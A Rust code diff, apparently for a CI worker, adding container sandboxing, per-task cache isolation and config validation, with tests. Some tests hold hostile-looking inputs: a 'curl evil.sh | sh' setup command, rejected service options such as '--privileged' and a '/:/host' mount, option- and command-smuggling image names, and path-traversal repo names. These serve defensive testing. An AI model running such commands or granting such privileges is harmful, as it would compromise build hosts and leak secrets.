         IN_FLIGHT.lock().unwrap_or_else(|e| e.into_inner()).push((name.to_string(), tree_hash.to_string(), cancel.clone()));
         let out = self.check_steps(objects, tree, name, files, steps_override, part, &cancel);
+        set_phase(name, None);
         IN_FLIGHT.lock().unwrap_or_else(|e| e.into_inner()).retain(|(_, _, f)| !Arc::ptr_eq(f, &cancel));
         out
     }
 
     fn check_steps(&self, objects: &Objects, tree: &Tree, name: &str, files: &[String], steps_override: Option<&str>, part: Option<&Part>, cancel: &AtomicBool) -> Result<(Vec<Step>, PathBuf)> {
         let queued = Instant::now();
+        let (waiting, running) = local();
+        if waiting + running >= check_slots() {
+            set_phase(name, Some(format!("waiting for a machine ({} ahead)", waiting + running + 1 - check_slots())));
+        }
         let slot = Slot::take(name);
         let taken = Instant::now();
+        set_phase(name, Some("preparing (laying out the candidate, installing the dependencies)".into()));
         PREP.with(|p| p.set(Prep { slot_s: (taken - queued).as_secs_f64(), ..Prep::default() }));
         let cfg = read_config(tree, objects)?.check;
+        self.one_repo()?;
         // The job's time, from its slot, when a sandbox bounds it.
         let deadline = self.sandbox.as_ref().and_then(|s| s.limits.timeout_s).map(|t| taken + Duration::from_secs(t));
-        let setup_dir = self.setup(objects, tree, &cfg, deadline)?;
         // One folder per slot, reused: the disk holds as many candidates as run at once. Folders
         // of the AVP that named them after their task go.
         let dir = self.work.join(format!("slot-{}", slot.0));
+        let caches = self.caches(name)?;
+        let mut settle = Settle { ws: self, caches, name: name.to_string(), slot: dir.clone(), left_by: self.work.join(format!("slot-{}.left-by", slot.0)), keep: cfg.keep.clone(), green: false };
+        let caches = &settle.caches;
+        let setup_dir = self.setup(objects, tree, &cfg, caches, deadline)?;
         for old in fs::read_dir(&self.work).into_iter().flatten().flatten() {
             if !old.file_name().to_string_lossy().starts_with("slot-") {
                 let _ = remove_all(&old.path());
             }
         }
+        if self.sandbox.is_some() {
+            fs::create_dir_all(&self.work)?;
+            self.claim_slot(&dir, &settle.left_by, name, &cfg.keep)?;
+        }
         // The setup's links stay from one candidate to the next only while they point into the
-        // same setup: a dependency it gained since must be there.
+        // same setup, at the same place (in a sandbox, the job's own copy of it): a dependency it
+        // gained since must be there.
         let linked = dir.join(".avp-linked");
-        let setup_fp = setup_dir.as_ref().and_then(|s| fs::read_to_string(s.join(".avp-setup")).ok()).unwrap_or_default();
+        let setup_fp = setup_dir.as_ref().and_then(|s| fs::read_to_string(s.join(".avp-setup")).ok().map(|fp| format!("{}\n{fp}", s.display()))).unwrap_or_default();
         let same_setup = fs::read_to_string(&linked).ok().as_deref() == Some(setup_fp.as_str());
         let mut keep = cfg.keep.clone();
         if same_setup {
@@ -2540,7 +2866,7 @@ impl Workspace {
                 mounts.push(&folder);
             }
             mounts.extend(setup_dir.as_deref());
-            match self.jail(&cfg, &mounts, &dir, deadline) {
+            match self.jail(&cfg, &mounts, caches, &dir, deadline) {
                 Ok(jail) => jail,
                 Err(e) => return Ok((vec![Step { name: "sandbox".into(), command: String::new(), exit: 1, seconds: taken.elapsed().as_secs_f64(), output: format!("{e:#}") }], dir)),
             }
@@ -2557,6 +2883,7 @@ impl Workspace {
             }
         };
         let mut budget = ARTIFACTS_MAX;
+        let name_of_check = name;
         for (name, cmd, secrets, artifacts) in todo {
             if cancel.load(Ordering::Relaxed) {
                 out.push(Step { name, command: cmd, exit: CANCELLED, seconds: 0.0, output: "cancelled: the task's files changed, a newer tree is being proven".into() });
@@ -2573,10 +2900,11 @@ impl Workspace {
                 break;
             }
             let given: Vec<(OsString, OsString)> = secrets.iter().map(|n| (OsString::from(n), OsString::from(&values[n]))).collect();
+            set_phase(name_of_check, Some(format!("running step {name}")));
             let (mut step, log) = run_with(&dir, &cmd, cancel, &env, &given, None, jail.as_ref());
             step.name = name;
             if step.exit != CANCELLED {
-                self.keep(&step, log, &dir, &artifacts, &mut budget);
+                self.keep(&step, log, &dir, &artifacts, &mut budget, jail.as_ref());
             }
             let failed = step.exit != 0;
             out.push(step);
@@ -2584,6 +2912,7 @@ impl Workspace {
                 break;
             }
         }
+        settle.green = out.iter().all(|s| s.exit == 0);
         Ok((out, dir))
     }
 }
@@ -2814,6 +3143,17 @@ mod tests {
         assert!(git("[git]\npull_requests = \"merge\"").unwrap_err().contains("true, false or \"land\""));
     }
 
+    /// A key avp.toml does not know is refused, not ignored: `[[steps]]` for `[[check.steps]]`
+    /// would land every change unproven.
+    #[test]
+    fn an_unknown_key_in_avp_toml_is_refused() {
+        let read = |toml: &str| toml::from_str::<AvpConfig>(toml).map(|_| ()).map_err(|e| e.to_string());
+        assert!(read("[[steps]]\nname = \"ok\"\nrun = \"echo ok\"\n").unwrap_err().contains("unknown field `steps`"));
+        assert!(read("[check]\nstep = []\n").unwrap_err().contains("unknown field `step`"));
+        assert!(read("[[check.steps]]\nname = \"t\"\nrun = \"x\"\nneeds_file = true\n").unwrap_err().contains("unknown field `needs_file`"));
+        read("[check]\n[[check.steps]]\nname = \"t\"\nrun = \"x\"\nneeds_files = true\n").unwrap();
+    }
+
     /// A shard with a matrix runs once per combination, named after its values, which its steps
     /// read as MATRIX_<KEY>; `full` is the one shard when there are none.
     #[test]
@@ -2986,7 +3326,7 @@ secrets = ["BROWSER_TOKEN"]
     /// Whatever the process running the proof holds (here cargo's CARGO_PKG_* and the rest of the
     /// test's environment), a step sees only what `step_env` lets through and what AVP sets.
     fn sandbox(tool: &'static str) -> Sandbox {
-        Sandbox { tool, image: "worker:1".into(), user: "1000:1000".into(), limits: Limits { cpus: Some("2".into()), memory: Some("4g".into()), pids: Some(512), disk: Some("10g".into()), timeout_s: Some(600) }, owner: "/srv/w1/data".into() }
+        Sandbox { tool, image: "worker:1".into(), user: "1000:1000".into(), limits: Limits { cpus: Some("2".into()), memory: Some("4g".into()), pids: Some(512), disk: Some("10g".into()), timeout_s: Some(600) }, owner: "/srv/w1/data".into(), runtime: None }
     }
 
     /// The container a job runs in: only its folders, at the same path, a read-only root and a
@@ -2994,15 +3334,19 @@ secrets = ["BROWSER_TOKEN"]
     /// its own network, labelled for the worker that owns it.
     #[test]
     fn a_jobs_container_is_a_sandbox() {
-        let a = sandbox("docker").run_args("node:22", "avp-job-x", &[Path::new("/srv/w1/data/work/r/slot-0")], Path::new("/srv/w1/data/cache/r/home"));
+        let a = sandbox("docker").run_args("node:22", "avp-job-x", &[Path::new("/srv/w1/data/work/r/slot-0")], (Path::new("/srv/w1/data/cache/r/own/task_a/home"), Path::new("/srv/w1/data/cache/r/home")));
         let line = a.join(" ");
         for want in ["run -d --name avp-job-x --label avp.sandbox=/srv/w1/data --network avp-job-x", "--user 1000:1000", "--cap-drop ALL", "--security-opt no-new-privileges", "--read-only", "--tmpfs /tmp:rw,nosuid,nodev,mode=1777,size=10g", "--cpus 2 --memory 4g --memory-swap 4g --pids-limit 512", "-e HOME=/srv/w1/data/cache/r/home", "--entrypoint sh node:22 -c"] {
             assert!(line.contains(want), "{want} missing from {line}");
         }
         let mounts: Vec<&String> = a.iter().zip(a.iter().skip(1)).filter(|(f, _)| *f == "-v").map(|(_, m)| m).collect();
-        assert_eq!(mounts, ["/srv/w1/data/work/r/slot-0:/srv/w1/data/work/r/slot-0"]);
-        assert!(!line.contains("--privileged") && !line.contains("docker.sock") && !line.contains("--userns"));
-        assert!(sandbox("podman").run_args("node:22", "j", &[], Path::new("/h")).contains(&"--userns=keep-id".to_string()));
+        // The task's own copy of the repo's home, where the line's is: never the line's itself.
+        assert_eq!(mounts, ["/srv/w1/data/work/r/slot-0:/srv/w1/data/work/r/slot-0", "/srv/w1/data/cache/r/own/task_a/home:/srv/w1/data/cache/r/home"]);
+        assert!(!line.contains("--privileged") && !line.contains("docker.sock") && !line.contains("--userns") && !line.contains("--runtime"));
+        assert!(sandbox("podman").run_args("node:22", "j", &[], (Path::new("/h"), Path::new("/h"))).contains(&"--userns=keep-id".to_string()));
+        // gVisor when the worker asks for it: a kernel of the job's own.
+        let gvisor = Sandbox { runtime: Some("runsc".into()), ..sandbox("docker") };
+        assert!(gvisor.run_args("node:22", "j", &[], (Path::new("/h"), Path::new("/h"))).join(" ").contains("--read-only --runtime runsc"));
         // Its network's bridge is named for the firewall's rules, by either tool.
         assert_eq!(sandbox("docker").network_args("j", "avpj0123456789a").join(" "), "network create --label avp.sandbox=/srv/w1/data --driver bridge -o com.docker.network.bridge.name=avpj0123456789a j");
         assert_eq!(sandbox("podman").network_args("j", "avpj0123456789a").join(" "), "network create --label avp.sandbox=/srv/w1/data --interface-name avpj0123456789a j");
@@ -3020,11 +3364,15 @@ secrets = ["BROWSER_TOKEN"]
         assert_eq!(given, ["NODE_OPTIONS"]);
     }
 
-    /// A job's services share its network: no port on the host, its limits, no new privilege.
+    /// A job's services share its network: no port on the host, no folder of the machine, its limits
+    /// and runtime, no new privilege, only a database's capabilities, swept as the job's are.
     #[test]
     fn a_sandboxed_service_joins_the_jobs_network_only() {
-        let jail = Jail { tool: "docker", name: "avp-job-x".into(), limits: Limits { memory: Some("1g".into()), ..Limits::default() }, deadline: None, dir: PathBuf::new() };
-        assert_eq!(jail.service_args().join(" "), "--network container:avp-job-x --security-opt no-new-privileges --memory 1g --memory-swap 1g");
+        let jail = Jail { tool: "docker", name: "avp-job-x".into(), limits: Limits { memory: Some("1g".into()), pids: Some(256), ..Limits::default() }, deadline: None, dirs: vec![], owner: "/srv/w1/data".into(), runtime: Some("runsc".into()) };
+        assert_eq!(
+            jail.service_args().join(" "),
+            "--network container:avp-job-x --label avp.sandbox=/srv/w1/data --cap-drop ALL --cap-add CHOWN --cap-add DAC_OVERRIDE --cap-add FOWNER --cap-add SETGID --cap-add SETUID --cap-add NET_BIND_SERVICE --security-opt no-new-privileges --runtime runsc --memory 1g --memory-swap 1g --pids-limit 256"
+        );
         std::mem::forget(jail);
         let table = "  sl  local_address rem_address   st\n   0: 00000000:1538 00000000:0000 0A 00000000\n   1: 0100007F:18EB 0100007F:9C40 01 00000000\n";
         assert!(listens(table, 5432), "0x1538 listens");
@@ -3043,9 +3391,84 @@ secrets = ["BROWSER_TOKEN"]
         assert!(limit_hit(1, "sh: fork: Resource temporarily unavailable", &l).unwrap().contains("AVP_SANDBOX_PIDS=256"));
         assert!(limit_hit(1, "write: No space left on device", &l).unwrap().contains("AVP_SANDBOX_DISK=20g"));
         assert_eq!(limit_hit(1, "assertion failed", &l), None);
-        let jail = Jail { tool: "docker", name: "j".into(), limits: l, deadline: Some(Instant::now()), dir: PathBuf::new() };
+        let jail = Jail { tool: "docker", name: "j".into(), limits: l, deadline: Some(Instant::now()), dirs: vec![], owner: String::new(), runtime: None };
         assert!(jail.over(&mut Instant::now()).unwrap().contains("900s (AVP_WORKER_RUN_S)"));
         std::mem::forget(jail);
+    }
+
+    /// avp.toml cannot give a service the machine: an option, a folder, a privilege, or an image name
+    /// docker would read as an option, is refused as the config is read.
+    #[test]
+    fn a_service_cannot_ask_for_privileges() {
+        let read = |extra: &str| toml::from_str::<AvpConfig>(&format!("[[check.services]]\nname = \"db\"\n{extra}\n")).map(|_| ()).map_err(|e| e.to_string());
+        assert_eq!(read("image = \"postgres:16\""), Ok(()));
+        for bad in ["options = \"--privileged\"", "privileged = true", "volumes = [\"/:/host\"]", "cap_add = [\"SYS_ADMIN\"]", "network = \"host\"", "user = \"root\""] {
+            assert!(read(&format!("image = \"postgres:16\"\n{bad}")).unwrap_err().contains("is not taken"), "{bad}");
+        }
+        for image in ["--privileged", "-v=/:/h", "postgres 16", "a;rm"] {
+            assert!(read(&format!("image = {image:?}")).unwrap_err().contains("is not an image's name"), "{image}");
+        }
+        assert!(image_ref("ghcr.io/org/img:1.2@sha256:0123abcd").is_ok());
+    }
+
+    /// The setup's products are keyed by its command and every file it is laid out with: a task that
+    /// keeps the lockfile and changes the command makes a setup of its own.
+    #[test]
+    fn a_setup_is_its_command_and_its_files() {
+        let tree = |blob: &str| Tree::from([("pnpm-lock.yaml".to_string(), Entry { blob: blob.into(), mode: 0o100644 })]);
+        let fp = fingerprint(&tree("a"), "pnpm install --frozen-lockfile");
+        assert_eq!(fp, fingerprint(&tree("a"), "pnpm install --frozen-lockfile"));
+        assert_ne!(fp, fingerprint(&tree("a"), "pnpm install --frozen-lockfile && curl evil.sh | sh"));
+        assert_ne!(fp, fingerprint(&tree("b"), "pnpm install --frozen-lockfile"));
+    }
+
+    /// Two repos (two organizations) never share a folder of a worker, and a job cannot name another's.
+    #[test]
+    fn a_repos_caches_are_its_own() {
+        let data = Path::new("/srv/w1/data");
+        let (a, b) = (Workspace::new(data, "repo_a"), Workspace::new(data, "repo_b"));
+        assert!(a.cache != b.cache && a.work != b.work && a.one_repo().is_ok());
+        for bad in ["../repo_b", "repo_a/../../x", "", "."] {
+            assert!(Workspace::new(data, bad).one_repo().is_err(), "{bad:?}");
+        }
+    }
+
+    /// In a sandbox, a task writes its own copy of the line's caches, never the line's: a red or cut
+    /// proof leaves them as they were, and only a green shard of the whole suite saves its own. A
+    /// slot another task left is laid out anew, whatever the files in it say.
+    #[test]
+    fn a_red_proof_never_writes_a_cache_a_later_proof_trusts() {
+        let data = std::env::temp_dir().join(format!("avp-test-caches-{}", ulid::Ulid::new()));
+        let ws = Workspace::new(&data, "repo_a").with_sandbox(Some(Sandbox { owner: data.display().to_string(), ..sandbox("docker") }));
+        let read = |p: &Path| fs::read_to_string(p).unwrap_or_default();
+        fs::create_dir_all(ws.cache.join("home")).unwrap();
+        fs::write(ws.cache.join("home/registry"), "line").unwrap();
+        let (slot, left_by) = (ws.work.join("slot-0"), ws.work.join("slot-0.left-by"));
+        let job = |name: &str, poison: &str, green: bool| {
+            let caches = ws.caches(name).unwrap();
+            assert_eq!(caches.home_at, ws.cache.join("home"), "seen where the line's is");
+            let seen = read(&caches.home.join("registry"));
+            fs::create_dir_all(&ws.work).unwrap();
+            ws.claim_slot(&slot, &left_by, name, &["target".into()]).unwrap();
+            let built = read(&slot.join("target/lib"));
+            fs::write(caches.home.join("registry"), poison).unwrap();
+            fs::create_dir_all(slot.join("target")).unwrap();
+            fs::write(slot.join("target/lib"), poison).unwrap();
+            fs::write(slot.join(".avp-laid"), "{}").unwrap();
+            drop(Settle { ws: &ws, caches, name: name.into(), slot: slot.clone(), left_by: left_by.clone(), keep: vec!["target".into()], green });
+            (seen, built)
+        };
+        assert_eq!(job("task_a", "evil", false), ("line".into(), "".into()));
+        assert_eq!(read(&ws.cache.join("home/registry")), "line", "a red task's home is its own");
+        assert_eq!(job("task_b", "b", true), ("line".into(), "".into()), "another task finds neither task_a's home nor its build");
+        assert_eq!(job("task_b", "b2", true), ("b".into(), "b".into()), "a task finds its own again");
+        assert_eq!(job("line-0", "bad", false), ("line".into(), "".into()), "a red shard of the line saves nothing");
+        assert_eq!(read(&ws.cache.join("home/registry")), "line");
+        job("line-0", "v2", true);
+        assert_eq!((read(&ws.cache.join("home/registry")), read(&ws.cache.join("keep/target/lib"))), ("v2".into(), "v2".into()), "a green shard of the line saves its own");
+        assert_eq!(job("task_c", "c", false), ("v2".into(), "v2".into()), "the next task starts from the line's");
+        assert!(fs::read_dir(ws.cache.join("own")).unwrap().flatten().all(|e| !e.file_name().to_string_lossy().starts_with('.')), "no shard's copy is left");
+        let _ = fs::remove_dir_all(&data);
     }
 
     /// A worker whose sandbox reaches the cloud's metadata, or cannot tell, does not start.
@@ -3058,6 +3481,12 @@ secrets = ["BROWSER_TOKEN"]
     }
 
     #[test]
+    fn what_an_agent_reads_of_a_log_has_no_terminal_escapes() {
+        let colored = "\x1b[32m✓\x1b[39m a.test.ts \x1b[2m(3 tests)\x1b[22m\n\x1b]8;;http://x\x07link\x1b]8;;\x07 \x1b[1;31mFAIL\x1b[0m\x1b[K";
+        assert_eq!(strip_ansi(colored), "✓ a.test.ts (3 tests)\nlink FAIL");
+    }
+
+    #[test]
     fn a_step_starts_from_a_scrubbed_environment() {
         let dir = std::env::temp_dir().join(format!("avp-test-env-{}", ulid::Ulid::new()));
         fs::create_dir_all(&dir).unwrap();
@@ -3066,7 +3495,7 @@ secrets = ["BROWSER_TOKEN"]
         assert_eq!(step.exit, 0, "{}", step.output);
         let allowed: Vec<String> = step_env(std::env::vars_os(), &std::env::var("AVP_PROOF_ENV").unwrap_or_default(), &std::env::var("AVP_DEPLOY_ENV").unwrap_or_default()).into_iter().map(|(k, _)| k.into_string().unwrap()).collect();
         // Set by AVP for every step, and by the shell itself.
-        let set = ["CI", "AVP", "TRAME", "LANG", "LC_ALL", "PWD", "OLDPWD", "SHLVL", "_"];
+        let set = ["CI", "AVP", "TRAME", "LANG", "LC_ALL", "NO_COLOR", "FORCE_COLOR", "PWD", "OLDPWD", "SHLVL", "_"];
         let seen: Vec<&str> = step.output.lines().filter_map(|l| l.split_once('=')).map(|(k, _)| k).collect();
         assert!(seen.contains(&"CI"), "{}", step.output);
         for k in seen {
